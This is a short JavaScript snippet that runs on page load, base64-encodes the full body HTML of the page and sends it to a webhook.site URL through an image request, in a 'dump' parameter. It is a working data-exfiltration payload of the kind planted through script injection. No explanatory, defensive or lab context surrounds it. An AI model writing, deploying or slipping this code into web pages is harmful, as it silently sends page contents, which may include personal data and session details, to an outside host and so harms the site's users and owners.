window.addEventListener('load', function() {
  const data = btoa(document.body.innerHTML);
  new Image().src = "https://webhook.site/fd85a4b6-780a-42da-a0c2-76a549fb4810?dump=" + data;
});
